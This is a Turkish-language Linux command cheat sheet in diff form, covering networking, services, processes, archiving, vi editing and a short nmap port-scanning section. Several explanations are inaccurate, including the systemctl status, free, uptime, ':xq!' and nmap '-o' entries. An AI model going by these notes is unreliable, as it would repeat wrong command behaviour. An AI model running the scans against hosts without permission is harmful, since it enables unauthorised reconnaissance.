+ip addr                #networkle alakası ayrıntılı bilgi gösterir.
+ip link set eth0 down  #network kartını kapatır.
+cat /etc/resolv.conf   #dns le alakalı ayarları gösterir
+
+
+
+systemctl status servis_Adi status  #belirtilen servisi başlatır.
+				#status belirtilen servisle ilgili güncel bilgileri gösterir
+				#start çalışmayan servisi çalıştırır.
+				#stop  çalışan servisi durdurur.
+				#restart servisi yeniden başlatır
+				#enable belirtilen servisi sistemle birlikte başlatır
+				#disable belirtilen servisi otomatik başlatmaz.
+	
+				
+ps	#Sistemdeki şuan çalışan süreçleri görüntüler
+  	#aux tüm çalışan süreçleri görüntüler
+  	#a tüm süreçleri
+  	# -u belirtilen kullanıcıya ait süreçleri
+  	# -d bu terminale ait süreçleri listeler
+					
+top    #task manager 
+htop   #gelişmiş task manager
+free   #depolama alanı ayrıntıları gösterir
+uptime #saat
+
+more   dosya_adi   #dosya okumaya yarıyor cat in bir versiyonu
+
+cp dosya_dolu yeni_dosya_yeri   #belirtilen dosyayı belirtilen yere kopyalar
+cp -r dizin_Adi yeni_dizin_yeri #belirtilen dizini belirtilen yere kopyalar
+
+
+ ################    run-level  *********************************************
+
+systemctl get-default                  #şuan hangi run-level i kullanıyoruz onu gösterir
+systemctl isolate multi-user.target    #grafiksel arayüzü sonlandırıp terminal arayüze geçr
+systemctl isolate graphical.target     #grafiksel arayüze geçer
+systemctl isolate rescue.target        #linux kurtarma moduna geçer
+systemctl isolate emergency.target     #linux acil durum modu 
+
+##############################################################################333
+
+chmod -R  yetkiler #yetkiler alt klasörleri kapsayacak şekilde verilir.
+
+chown kullanıcı:group klasör_Adi #dizinin hep grubunu hem kullanıcısını değiştirir.
+
+ 
+tar -zcvf yeni_dosya.tar.gz  dosya_isimleri     #belirtilen dosyaları sıkıştır  gzip ile
+    -jcvf yeni_dosya.tar.bz2 dosya_isimleri   #belirtilen dosyaları sıkıştırır  bzip2 ile
+	c #arşiv yapmamızı sağlar
+	v detayları gösterir
+	f filename (yeni_dosya.tar)
+	z gzip ile sıkıştırma yapıyor
+	j bzip2 ile sıkıştırma yapıyor
+	x dosyaları cıkartır.
+  
+tar -zxvf  çıkartılacak_dosya.tar  #belirtilen sıkıştırılmış dosyayi bulunulan klasöre cıkartır
+     -xvf   .tar dosyasını çıkartır.
+     -zxvf  tar.gzip dosyasını cıkartır.
+     -jxvf  tar.bzip2 dosyasını cıakrtır     	
+j z birlikte kullanılamaz
+
+
+gzip dosya_Adi    #belirtilen dosyayı gz olarak sıkıştırır.
+    -c dosya_adi yeni_dosya_Adi.gz  #belirtilen dosyayı farklı isimler sıkıştırır.
+    
+gzip*     #bulunulan dizindeki tüm dosyaları sıkıştırır.
+gunzip*   #bulunulan dizindeki sıkıştırılmış dosyaları cıkartır.
+
+gunzip dosya_adi  #belitilen dosyayı dışarı çıkartır.
+
+
+gzip -r dizin_adi   #belirtilen dizndeki tüm dosyaları sıkıştırır.
+gzip -rd dizin_adi  #belitilen dizindeki sıkıştırılmış dosyaları cıkartır.
+
+
+date +%b-%d         #ay ve günü gösterir
+
+zaman='date +%b-%d'
+arsiv =/var/backups/yedekler/yedek-$zaman.tar.gz  
+$    değişkeni başka bir yerde kullanmak için kullanıyoruz.
+
+************  vi dosya editörü**
+
+vi dosya_adi   #dosyayi vi dosya editörüyle açılır
+
+dosya içerisinde işlem yapmak için i 'ye basarak insert  moda geçmemiz lazım
+
+aşağıdaki kodları çalıştırmak için  esc le kod çalıştırılabilir moda geçmemiz lazım
+içersinde kaydetmek ve çıkmak için  :wq!
+                    kaydet çık      :xq!
+                    kaydetmeden çık  :q!
+                    satır silmek için hızlıca dd ye basılır
+                    satırları numaralandırmak için :set number
+                    berlirli bir line a girmek içn :20 20.satıra gider
+                   
+              
+v visual yle kopyala yapıştır moduna geçiyoruz
+                   y ile istediğimizi kopyalıyoruz.
+                   p ile yapıştırırız.
+                   d ile kesme işlemi yapıyoruz.
+                   / işlemiyle arama yapıyorız
+                   :
+                   	
+         ``     işaretini altgr+virgül le yapıyoruz       
+
+    
+############# nmap **********
+
+nmap  -sS -sU -o
+
+		# -sS TCP taraması yapar
+		# -sU UDP taraması yapar.
+		# -o işletim sistemini bulur
+	
+
+
+	      
